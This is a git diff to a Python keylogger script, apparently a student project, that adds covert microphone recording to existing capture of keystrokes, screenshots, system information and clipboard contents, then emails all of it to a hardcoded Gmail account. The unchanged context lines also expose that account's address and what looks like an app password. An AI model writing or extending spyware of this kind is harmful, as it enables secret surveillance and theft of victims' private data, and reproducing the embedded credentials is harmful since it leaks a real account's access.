@@ -12,6 +12,8 @@ from scipy.io.wavfile import write
 import sounddevice as sd
 from requests import get
 from PIL import ImageGrab
+import pyaudio
+import wave
 
 keys_info = "keys_information.txt"
 sys_info = "system_information.txt"
@@ -22,7 +24,7 @@ screenshot_info = "screenshot.png"
 email_address = "keyloggerprojectt@gmail.com"
 password = "zwbmmwxxgxqhjmpe"
 toaddr = "keyloggerprojectt@gmail.com"
-file_path = "C:\\Users\\lenovo\\PycharmProjects\\finalproject\\Project"
+file_path = "C:\\Users\\lenovo\\OneDrive\\Masaüstü\\KeyloggerProject\\Project"
 extend = "\\"
 
 count = 0
@@ -61,7 +63,7 @@ start_time = time.time()
 
 def on_release(key):
     current_time = time.time()
-    timer = 15
+    timer = 10
     if current_time - start_time > timer:
         return False
 
@@ -154,7 +156,53 @@ def screenshot():
 
 screenshot()
 
+def collectAudio():
+
+    # Set parameters for audio recording
+    CHUNK = 1024  # Number of frames per buffer
+    FORMAT = pyaudio.paInt16  # Audio format
+    CHANNELS = 2  # Number of audio channels
+    RATE = 44100  # Sampling rate (Hz)
+    RECORD_SECONDS = 5  # Duration of audio recording
+
+    # Create PyAudio object
+    audio = pyaudio.PyAudio()
+
+    # Open audio stream
+    stream = audio.open(format=FORMAT,
+                        channels=CHANNELS,
+                        rate=RATE,
+                        input=True,
+                        frames_per_buffer=CHUNK)
+
+    print("Recording started...")
+
+    with open(file_path + extend + audio_information, "a"):
+        wave_file = wave.open("audio.wav", "wb")
+        wave_file.setnchannels(CHANNELS)
+        wave_file.setsampwidth(audio.get_sample_size(FORMAT))
+        wave_file.setframerate(RATE)
+
+        # Record audio data and save to file
+        for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
+            data = stream.read(CHUNK)
+            wave_file.writeframes(data)
+
+        print("Recording stopped.")
+
+        # Close wave file and audio stream
+        wave_file.close()
+        stream.stop_stream()
+        stream.close()
+        audio.terminate()
+
+
+collectAudio()
+
+
+
 send_email(keys_info, file_path + extend + keys_info, toaddr)
 send_email(screenshot_info, file_path + extend + screenshot_info, toaddr)
 send_email(sys_info, file_path + extend + sys_info, toaddr)
 send_email(clipboard_info, file_path + extend + clipboard_info, toaddr)
+send_email(audio_information,file_path+extend+audio_information, toaddr)
